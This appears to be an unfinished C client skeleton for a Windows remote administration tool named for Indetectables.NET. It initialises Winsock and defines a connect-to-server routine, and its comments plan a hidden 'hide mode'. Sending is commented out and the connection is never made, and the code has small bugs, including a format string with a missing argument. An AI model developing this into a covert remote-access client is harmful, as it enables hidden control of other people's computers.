#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/**
Indetectables.NET Remote Administration Tool
https://github.com/IndetectablesNet/IndetectablesRAT

to compile: wsock32 && -static-libgcc
**/

//pd: in the future we will have to delete all outputs because we have to execute that on "hide mode"

//Win error initializer
int errorMsg(int i, char *message){
    if(i == 0){
        fprintf(stderr, "%s:%d\n", message);
    }else{
        fprintf(stderr, "%s:%d\n", message, WSAGetLastError());
    }
    WSACleanup();
    return -1;
}

//WSA initializer
int init_WSA(){
    WSADATA wsaData;

    if((WSAStartup(0x202, &wsaData)) != 0){
        errorMsg(0, "error mensaje");
    }else{
        printf("WSAStartup was initilizated succesfully\n");
    }
}

//Method to connect with the server
int connectToPyServ(char *ipToConn, int port){
    SOCKET socketConn;
    struct sockaddr_in servaddr;

    servaddr.sin_family   =   AF_INET;
    servaddr.sin_addr.S_un.S_addr     =   inet_addr(ipToConn);
    servaddr.sin_port     =   htons(port);

    //creating a socket
    socketConn = socket(AF_INET, SOCK_STREAM, 0);
    if(socketConn < 0){
        errorMsg(1, "Error creating the socket");
    }else{
        printf("The socket was created succesfully\n");
    }

    //connecting to the server:
    printf("Triying to connect...");//only to tell us that is triying to connect :D
    if(connect(socketConn, (struct sockaddr*)&servaddr, sizeof(servaddr)) == SOCKET_ERROR){
        errorMsg(1, "Error triying to connect with the server");
    }else{
        printf("Connected!, are you ready?? :D\n");//remember all outputs will be removed in a near future
    }
}

/** this method is not ready yet, its only a test
about how to send data "via" sockets **/

/**
int senderToServ(){
    //no params by the moment, we have to think about...
    int counter = 0;
    char Buffer[100];

    while(1){//While true... :P
        wsprintf(Buffer, "Test msg");
        if((send(socketConn, Buffer, sizeof(Buffer), 0)) == SOCKET_ERROR){
            errorMsg(1, "Error sending data");
        }else{
            printf("sent correctly");
        }
    }
}
**/

/**
int recvData(){

}
**/

int main(){
    init_WSA();
    //connectToPyServ(ip, port);
    return 0;
}
